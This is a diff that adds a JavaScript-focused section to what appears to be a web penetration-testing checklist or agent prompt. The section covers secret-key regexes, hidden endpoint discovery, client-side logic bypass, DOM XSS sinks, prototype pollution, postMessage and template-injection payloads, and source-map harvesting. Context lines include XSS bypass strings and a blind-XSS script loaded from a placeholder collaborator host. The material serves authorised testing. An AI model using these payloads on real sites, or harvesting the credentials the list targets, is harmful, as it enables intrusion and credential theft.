@@ -22,6 +22,8 @@ Authorization: IDOR/BOLA (horizontal + vertical), BAC (function-level access con
 
 Client-side: Reflected/Stored/DOM XSS (all major sink types: innerHTML, document.write, eval, location.href, postMessage), CSRF (token absence, weak tokens, SameSite misconfiguration, JSON CSRF), CORS (origin reflection, null origin, subdomain wildcard, pre-domain match), Clickjacking, Client-side template injection, Prototype pollution (DOM-based + server-side via JSON merge), Content Security Policy bypass techniques.
 
+JavaScript security analysis: Secrets/API key extraction from JS source (hardcoded credentials, Firebase/AWS/Stripe keys, internal service URLs, process.env leakage in React/Vue/Angular bundles), hidden API endpoint discovery from JS router definitions and fetch/axios calls, Webpack source map exploitation (.map files, chunk enumeration), client-side business logic bypass (role checks, pricing logic, feature flags enforced only in JS), DOM clobbering, postMessage origin validation bypass, JSONP callback injection, client-side storage token exposure (localStorage/sessionStorage without HttpOnly), framework-specific sinks (React dangerouslySetInnerHTML, AngularJS CSTI, Vue v-html directive).
+
 Server-side: SSRF (standard + blind OOB, cloud metadata, internal network probing, protocol confusion), Path traversal/LFI/RFI (URL encoding, null byte, UNC paths, PHP wrappers), File upload bypass (MIME spoofing, double extension, polyglot, IIS tilde enumeration), HTTP Request Smuggling (CL.TE, TE.CL, HTTP/2 downgrade), Cache poisoning (web cache deception, unkeyed headers, cache key normalization), SSTI to RCE, XXE full coverage (classic/blind/OOB/SVG/XLSX/XInclude/SSRF-via-XXE).
 
 Deserialization: Java (ysoserial gadget chains, rO0AB signature, URLDNS probe), PHP (O:N:"ClassName" pattern, magic method abuse), Python (pickle opcode injection, __reduce__), .NET (ViewState without MAC, BinaryFormatter, TypeNameHandling.All in JSON.NET), JSON deserialization confusion (Jackson @class, @type, Gson typeAdapter, FastJson autoType), Node.js prototype pollution (__proto__, constructor.prototype, __defineGetter__).
@@ -213,6 +215,115 @@ For FOUND and POSSIBLE, provide the full finding block defined in Phase 3.
     DOM: scan response body JS for sinks: innerHTML, outerHTML, document.write, eval, setTimeout(string), location.href=, location.replace=
     Filter bypass: <ScRiPt>, <svg onload=alert(1)>, &#x3C;script&#x3E;, \u003cscript\u003e
     OOB/blind XSS: "><script src=//COLLABORATOR_URL/x.js></script>
+
+[ ] Advanced JavaScript Analysis (WSTG-CLNT-01 through WSTG-CLNT-13)
+    MANDATORY: If the response body contains ANY JavaScript (inline <script> blocks, .js file content,
+    bundled/minified JS, or JS framework bootstrap code), perform ALL checks below.
+
+    A. SECRETS & CREDENTIAL LEAKAGE IN JS SOURCE
+       Scan ALL JS content visible in the response for:
+       - API keys / tokens: patterns like apiKey=, api_key:, token:, secret:, password:, passwd:,
+         authorization:, bearer , AWS_ACCESS_KEY, AKIA[A-Z0-9]{16}, sk-[a-zA-Z0-9]{48}
+       - Firebase config: firebaseConfig = { apiKey: "...", authDomain: "...", ... }
+       - Google Maps / Stripe / Twilio / SendGrid / Mailgun API keys
+       - OAuth client_id / client_secret embedded in JS
+       - Private keys: BEGIN RSA PRIVATE, BEGIN EC PRIVATE, BEGIN PGP PRIVATE
+       - Hardcoded credentials: username/password combos, default admin creds
+       - Internal service URLs: http://10.x, http://172.16-31.x, http://192.168.x, localhost:PORT
+       - JWT secrets: jwt_secret, jwtSecret, JWT_SECRET
+       - Database connection strings: mongodb://, postgresql://, mysql://, redis://
+       - Cloud storage credentials: S3 bucket names + access keys, GCS tokens, Azure connection strings
+       SEVERITY: Critical if key grants API access; High if internal URL/path disclosed
+
+    B. HIDDEN & UNDOCUMENTED API ENDPOINTS
+       Extract ALL URL strings and API route patterns from JS:
+       - String literals: "/api/", "/v1/", "/v2/", "/admin/", "/internal/", "/debug/", "/dev/"
+       - Template literals: `${baseUrl}/endpoint`
+       - fetch(), axios.get/post/put/delete(), $.ajax(), XMLHttpRequest
+       - Router definitions: app.get('/path'), router.post('/path'), Route path= props
+       - GraphQL schemas/mutations/queries hardcoded in JS
+       - WebSocket endpoints: new WebSocket('wss://...')
+       Report: list discovered endpoints, HTTP method, and whether they require auth
+       Test: access admin/debug/internal endpoints without authentication
+
+    C. CLIENT-SIDE BUSINESS LOGIC FLAWS
+       - Role/permission checks done ONLY in JavaScript (not enforced server-side):
+         Look for: if (user.role === 'admin'), if (isAdmin), if (isPremium), hasPermission()
+         Test: remove the JS check, replay request directly -- does server enforce it?
+       - Price/discount calculation in frontend JS:
+         Look for: price *, discount /, totalPrice =, calcTotal(), applyDiscount()
+         Test: manipulate JS variables before form submit; intercept and modify calculated values
+       - Feature flags and A/B test conditions revealing hidden features:
+         Look for: featureFlags, enableFeature, betaFeature, experimentVariant
+       - Subscription/entitlement checks: isPaid, hasSubscription, planLevel comparison
+       - Client-side validation ONLY (no server-side mirror):
+         Look for: form.onsubmit validate(), regex test before submit, disabled button logic
+         Test: bypass by directly submitting the request via Burp Repeater
+
+    D. DOM-BASED VULNERABILITIES (WSTG-CLNT-01)
+       Sources (user-controlled input flowing into JS):
+         location.hash, location.search, location.href, document.URL, document.referrer,
+         document.cookie, window.name, postMessage event.data, localStorage/sessionStorage.getItem()
+       Sinks (dangerous JS execution points):
+         innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
+         eval(), new Function(), setTimeout(string), setInterval(string),
+         location.href=, location.replace=, location.assign=,
+         jQuery: $(), .html(), .append(), .prepend(), .after(), .before(), .wrap(),
+         AngularJS: ng-bind-html without $sce, template injection {{ }},
+         React: dangerouslySetInnerHTML={{ __html: ... }}
+       Map data flow: if a SOURCE flows into a SINK without sanitization = DOM XSS
+
+    E. PROTOTYPE POLLUTION (WSTG-CLNT-08)
+       Client-side indicators: _.merge(), $.extend(true,...), Object.assign() with user input,
+       JSON.parse() result merged into object, recursive merge functions
+       Test payload: {"__proto__":{"polluted":true}} or {"constructor":{"prototype":{"polluted":true}}}
+       DOM vector: ?__proto__[polluted]=1 or #__proto__[polluted]=1 via URL hash/params
+       Impact: escalate to XSS if polluted property is used as HTML, or RCE in Node.js
+
+    F. POSTMESSAGE / CROSS-FRAME VULNERABILITIES (WSTG-CLNT-10)
+       Look for: window.addEventListener('message', ...) in JS source
+       Check: does the handler validate event.origin before processing event.data?
+       Missing origin check: send crafted postMessage from attacker-controlled iframe → XSS/data leak
+       Look for: parent.postMessage(), window.parent.postMessage() leaking sensitive data
+       Test: open page in iframe from evil.com origin, call postMessage with payload
+
+    G. CLIENT-SIDE TEMPLATE INJECTION (WSTG-CLNT-05)
+       AngularJS (ng-app present): {{7*7}} → 49 in page → CSTI → RCE via $eval
+       Vue.js: {{7*7}}, ${7*7}
+       Handlebars: {{7*7}}
+       Check all user input reflected via template engine client-side rendering
+       Escalate: {{constructor.constructor('alert(1)')()}}
+
+    H. WEBPACK / BUNDLED JS INTELLIGENCE
+       If response contains bundled JS (webpack_require, __webpack_exports__, chunk hashes):
+       - Look for SourceMap header: X-SourceMap or sourceMappingURL=
+       - Fetch source map: [js_file].map → reveals original unminified source tree
+       - Enumerate chunk files: main.[hash].js, vendors.[hash].js, runtime.[hash].js
+       - Look for .env variable substitution: process.env.REACT_APP_*, process.env.VUE_APP_*
+         These values are BAKED INTO the bundle at build time and expose secrets in production
+
+    I. CLIENT-SIDE STORAGE EXPOSURE (WSTG-CLNT-12)
+       Identify what is stored in:
+       - localStorage: sensitive tokens, user data, session state that should be in HttpOnly cookies
+       - sessionStorage: authentication state, temporary secrets
+       - IndexedDB: cached API responses with PII/PHI
+       - JS cookies (accessible via document.cookie): auth tokens without HttpOnly flag
+       Impact: XSS can exfiltrate all of the above; tokens in localStorage = persistent session hijack
+
+    J. JSONP ENDPOINTS
+       Look for: callback= or jsonp= parameters in JS-initiated requests
+       Test: change callback value to arbitrary function name → XSS if reflected without sanitization
+       Modern browser restriction: only exploitable if Content-Type is text/javascript
+
+    K. JAVASCRIPT FRAMEWORK-SPECIFIC ISSUES
+       React:
+         - dangerouslySetInnerHTML: immediate XSS vector
+         - href={userInput}: javascript: URI injection
+         - eval/Function in render: rare but critical
+       Angular (AngularJS 1.x): client-side template injection; check ng-app + user input in DOM
+       Angular 2+: [innerHTML] binding with unsanitized data; bypassSecurityTrustHtml() calls
+       Vue.js: v-html directive with user input; template injection in dynamic components
+       jQuery: $(userInput) DOM XSS; .load() CSRF chain; .parseHTML() without DOMPurify
 
 [ ] CSRF (WSTG-SESS-05)
     Check: is this a state-changing request (POST/PUT/DELETE/PATCH)?
